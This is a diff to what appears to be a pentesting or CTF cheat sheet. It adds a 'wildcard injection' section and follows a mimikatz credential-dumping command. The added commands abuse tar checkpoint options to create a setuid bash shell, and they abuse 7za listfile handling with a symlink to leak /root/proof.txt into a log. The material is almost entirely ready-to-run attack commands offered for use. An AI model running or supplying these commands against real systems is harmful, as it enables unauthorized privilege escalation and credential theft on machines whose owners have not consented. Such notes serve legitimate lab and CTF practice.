@@ -203,3 +203,37 @@ lsadump::secrets
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::wdigest" "exit"
 ```
 
+# wildcard injection
+
+## tar
+
+- create shell.sh file
+
+```sh
+cp /bin/bash /tmp/bash2
+chmod +s /tmp/bash2
+```
+
+- create checkpoint options
+
+```sh
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+```
+
+## 7za
+
+`7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log`
+
+- link a file of interest
+
+```sh
+touch @root.zip
+ln -s /root/proof.txt root.zip
+```
+
+- check the log file after executed
+
+```sh
+cat /opt/backups/backup.log 
+```
